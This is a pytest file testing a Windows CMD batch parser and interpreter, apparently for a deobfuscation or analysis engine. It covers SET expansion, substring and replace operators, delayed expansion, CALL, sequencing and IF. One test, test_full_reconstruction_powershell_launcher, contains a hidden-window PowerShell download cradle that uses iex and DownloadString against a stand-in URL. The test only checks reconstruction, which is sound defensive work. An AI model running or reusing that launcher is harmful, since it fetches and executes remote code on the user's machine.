"""Phase 2 · CMD Parser + Interpreter tests (40 tests).

Covers:
  * Tokenizer edge cases
  * SET / %VAR% / %VAR:old=new% / %VAR:~offset,len%
  * Delayed !VAR! with SETLOCAL EnableDelayedExpansion
  * CALL 2nd-pass
  * & / && / || sequencing
  * IF equality (static evaluation)
  * ECHO
  * Quoting + backtick-of-CMD (^) escapes
  * Confidence drops on unknown vars
  * Unresolved nodes for deferred features
"""
import pytest

from engine.parsers.cmd_parser import CmdParser, tokenize
from engine.interpreters.cmd_interpreter import CmdInterpreter
from engine.exec_graph import NodeKind
from engine.semantic_ir import SIRKind


P = CmdParser()
I = CmdInterpreter()


def _run(text: str):
    sir = P.parse(text)
    graph = I.interpret(sir)
    return sir, graph


# ---------------------------------------------------------------------------
# Tokenizer
# ---------------------------------------------------------------------------
def test_tokenize_simple_set():
    toks = tokenize("SET X=1")
    kinds = [t.kind for t in toks if t.kind != "WS"]
    # 'SET' → WORD, 'X=1' → WORD (equals is not a separator by itself)
    assert "WORD" in kinds


def test_tokenize_pvar():
    toks = tokenize("echo %USERNAME%")
    kinds = [t.kind for t in toks if t.kind != "WS"]
    assert "PVAR" in kinds


def test_tokenize_delayed():
    toks = tokenize("echo !X!")
    kinds = [t.kind for t in toks if t.kind != "WS"]
    assert "DELAYED" in kinds


def test_tokenize_sep_operators():
    toks = tokenize("a && b || c & d")
    seps = [t.value for t in toks if t.kind == "SEP"]
    assert seps == ["&&", "||", "&"]


def test_tokenize_paren_block():
    toks = tokenize("(echo hi)")
    kinds = [t.kind for t in toks if t.kind not in ("WS", "NL")]
    assert kinds[0] == "LPAREN" and kinds[-1] == "RPAREN"


def test_tokenize_quoted_string_with_pvar():
    toks = tokenize('echo "hi %NAME%"')
    kinds = [t.kind for t in toks if t.kind not in ("WS", "NL")]
    assert "QUOTED" in kinds


def test_tokenize_redirection():
    toks = tokenize("dir > out.txt")
    redirs = [t for t in toks if t.kind == "REDIR"]
    assert len(redirs) == 1
    assert redirs[0].value == ">"


def test_tokenize_line_continuation_collapsed_in_parse():
    sir = P.parse("echo hi ^\nthere")
    # `^\n` should be gone from source; program has one command
    assert len([c for c in sir.root.children if c.kind == SIRKind.call_expr]) == 1


# ---------------------------------------------------------------------------
# SET assignments
# ---------------------------------------------------------------------------
def test_set_simple_assignment():
    sir, g = _run("SET X=notepad.exe")
    binds = [n for n in g.nodes if n.kind == NodeKind.var_bind]
    assert len(binds) == 1
    assert binds[0].args["name"] == "X"
    assert binds[0].args["value"] == "notepad.exe"


def test_set_then_expand_via_pvar():
    sir, g = _run("SET X=notepad.exe\nstart %X%")
    procs = [n for n in g.nodes if n.kind == NodeKind.process]
    assert len(procs) == 1
    assert "notepad.exe" in procs[0].reconstructed


def test_set_multiple_and_reference():
    sir, g = _run("SET A=cmd\nSET B=/c\nSET C=echo hi\n%A% %B% %C%")
    procs = [n for n in g.nodes if n.kind == NodeKind.process]
    assert len(procs) == 1
    assert "cmd" in procs[0].reconstructed and "echo" in procs[0].reconstructed


def test_set_slash_a_marked_unresolved():
    sir, g = _run("SET /A X=1+2")
    unresolved = [n for n in g.nodes if n.kind == NodeKind.unresolved]
    assert any("Phase 2.1" in (n.args.get("reason") or "") for n in unresolved)


def test_unknown_var_kept_as_literal():
    sir, g = _run("echo %DOES_NOT_EXIST%")
    procs = [n for n in g.nodes if n.kind == NodeKind.string_op]
    # ECHO emits string_op; the unknown var stays as %DOES_NOT_EXIST%
    assert procs and "%DOES_NOT_EXIST%" in procs[0].reconstructed


# ---------------------------------------------------------------------------
# %VAR:old=new% replace
# ---------------------------------------------------------------------------
def test_replace_operator():
    sir, g = _run("SET X=notepad.exe\necho %X:.exe=.com%")
    strop = [n for n in g.nodes if n.kind == NodeKind.string_op and n.args.get("op") == "replace"]
    assert strop and strop[0].reconstructed == "notepad.com"


def test_replace_no_match_yields_original():
    sir, g = _run("SET X=hello\necho %X:zz=YY%")
    strop = [n for n in g.nodes if n.kind == NodeKind.string_op and n.args.get("op") == "replace"]
    assert strop and strop[0].reconstructed == "hello"


# ---------------------------------------------------------------------------
# %VAR:~offset,len% substring
# ---------------------------------------------------------------------------
def test_substring_positive_offset_length():
    sir, g = _run("SET X=abcdef\necho %X:~2,3%")
    strop = [n for n in g.nodes if n.kind == NodeKind.string_op and n.args.get("op") == "substring"]
    assert strop and strop[0].reconstructed == "cde"


def test_substring_offset_only():
    sir, g = _run("SET X=abcdef\necho %X:~2%")
    strop = [n for n in g.nodes if n.kind == NodeKind.string_op and n.args.get("op") == "substring"]
    assert strop and strop[0].reconstructed == "cdef"


# ---------------------------------------------------------------------------
# Delayed !VAR!
# ---------------------------------------------------------------------------
def test_delayed_var_unresolved_without_setlocal():
    sir, g = _run("SET X=1\necho !X!")
    strop = [n for n in g.nodes if n.kind == NodeKind.string_op]
    # !X! remains literal because SETLOCAL EnableDelayedExpansion was not seen
    assert any("!X!" in n.reconstructed for n in strop)


def test_delayed_var_resolved_after_setlocal():
    sir, g = _run(
        "SETLOCAL EnableDelayedExpansion\nSET X=notepad\nstart !X!.exe"
    )
    procs = [n for n in g.nodes if n.kind == NodeKind.process]
    assert procs and "notepad.exe" in procs[0].reconstructed


# ---------------------------------------------------------------------------
# CALL 2nd-pass
# ---------------------------------------------------------------------------
def test_call_wraps_inner_command():
    sir, g = _run("SET X=echo hi\nCALL %X%")
    # We expect an echo string_op (from second-pass expansion) OR a process
    # spawn; whichever, plus a var_expand marker labelled 'call_second_pass'.
    markers = [n for n in g.nodes
               if n.kind == NodeKind.var_expand and n.args.get("kind") == "call_second_pass"]
    assert markers, "CALL 2nd-pass marker should be emitted"


# ---------------------------------------------------------------------------
# Sequencing
# ---------------------------------------------------------------------------
def test_sequence_and_and():
    sir, g = _run("echo first && echo second")
    strops = [n for n in g.nodes if n.kind == NodeKind.string_op and n.args.get("op") == "echo"]
    assert len(strops) == 2


def test_sequence_semicolons_ok():
    sir, g = _run("SET X=1 & SET Y=2 & echo done")
    binds = [n for n in g.nodes if n.kind == NodeKind.var_bind]
    assert len(binds) == 2


def test_sequence_or_or():
    sir, g = _run("echo a || echo b")
    strops = [n for n in g.nodes if n.kind == NodeKind.string_op and n.args.get("op") == "echo"]
    assert len(strops) == 2


# ---------------------------------------------------------------------------
# IF static evaluation
# ---------------------------------------------------------------------------
def test_if_equ_true_runs_then():
    sir, g = _run("SET X=abc\nIF %X% == abc echo match")
    strops = [n for n in g.nodes if n.kind == NodeKind.string_op and n.args.get("op") == "echo"]
    assert strops and "match" in strops[0].reconstructed


def test_if_equ_false_marked_static_skip():
    sir, g = _run("SET X=abc\nIF %X% == zzz echo nope")
    skipped = [n for n in g.nodes
               if n.kind == NodeKind.unresolved and n.args.get("static_eval") is True]
    assert skipped
    strops = [n for n in g.nodes
              if n.kind == NodeKind.string_op and n.args.get("op") == "echo"]
    assert not any("nope" in s.reconstructed for s in strops)


def test_if_defined_marked_unresolved():
    sir, g = _run("IF DEFINED X echo hi")
    unresolved = [n for n in g.nodes
                  if n.kind == NodeKind.unresolved
                  and "Phase 2.1" in (n.args.get("reason") or "")]
    assert unresolved


# ---------------------------------------------------------------------------
# ECHO
# ---------------------------------------------------------------------------
def test_echo_captures_full_text():
    sir, g = _run("echo hello world")
    strops = [n for n in g.nodes if n.kind == NodeKind.string_op and n.args.get("op") == "echo"]
    assert strops and strops[0].args["text"] == "hello world"


# ---------------------------------------------------------------------------
# Quoting + escape ^
# ---------------------------------------------------------------------------
def test_double_quoted_literal():
    sir, g = _run('echo "hi there"')
    strops = [n for n in g.nodes if n.kind == NodeKind.string_op and n.args.get("op") == "echo"]
    assert strops and "hi there" in strops[0].reconstructed


def test_caret_escapes_ampersand():
    # `echo a^&b` — the & is literal, no command sequence
    sir, g = _run("echo a^&b")
    # One echo statement
    strops = [n for n in g.nodes if n.kind == NodeKind.string_op and n.args.get("op") == "echo"]
    assert len(strops) == 1


# ---------------------------------------------------------------------------
# Confidence propagation smoke tests
# ---------------------------------------------------------------------------
def test_confidence_dropped_on_unknown_var():
    sir, g = _run("echo %UNKNOWN%")
    strops = [n for n in g.nodes if n.kind == NodeKind.string_op]
    # Command inherits min of piece confs; unknown var → 40
    assert strops[0].confidence <= 40


def test_confidence_full_on_literal_command():
    sir, g = _run("echo hi")
    strops = [n for n in g.nodes if n.kind == NodeKind.string_op]
    assert strops[0].confidence == 100


# ---------------------------------------------------------------------------
# Full end-to-end reconstruction
# ---------------------------------------------------------------------------
def test_full_reconstruction_powershell_launcher():
    src = (
        "SETLOCAL EnableDelayedExpansion\n"
        "SET IMG=powershell.exe\n"
        "SET FLAGS=-nop -w hidden\n"
        "SET CMD=iex (New-Object Net.WebClient).DownloadString('http://x/y')\n"
        "!IMG! !FLAGS! -c \"!CMD!\""
    )
    sir, g = _run(src)
    procs = [n for n in g.nodes if n.kind == NodeKind.process]
    assert procs
    r = procs[0].reconstructed
    assert "powershell.exe" in r
    assert "-nop" in r
    assert "DownloadString" in r


def test_final_command_carries_all_evidence_via_var_expand_nodes():
    sir, g = _run("SET X=cmd\nSET Y=/c\n%X% %Y% echo hi")
    var_expands = [n for n in g.nodes if n.kind == NodeKind.var_expand]
    # Two var_expand nodes (one per %VAR% expansion inside the command)
    assert len(var_expands) >= 2


# ---------------------------------------------------------------------------
# Immutability + evidence integrity
# ---------------------------------------------------------------------------
def test_graph_has_no_dangling_side_effects():
    _, g = _run("SET X=1\ncmd /c echo hi")
    assert g.dangling_refs() == []


def test_multiple_runs_deterministic_output():
    src = "SET X=notepad.exe\nstart %X%"
    _, g1 = _run(src)
    _, g2 = _run(src)
    # deterministic: same kinds, same reconstructions
    assert [n.kind for n in g1.nodes] == [n.kind for n in g2.nodes]
    assert [n.reconstructed for n in g1.nodes] == [n.reconstructed for n in g2.nodes]


# ---------------------------------------------------------------------------
# Parser output contract
# ---------------------------------------------------------------------------
def test_parser_emits_program_root():
    sir = P.parse("echo hi")
    assert sir.root.kind == SIRKind.program
    assert sir.parser == "cmd"


def test_parser_warnings_field_exists():
    sir = P.parse("echo hi")
    assert sir.warnings == ()
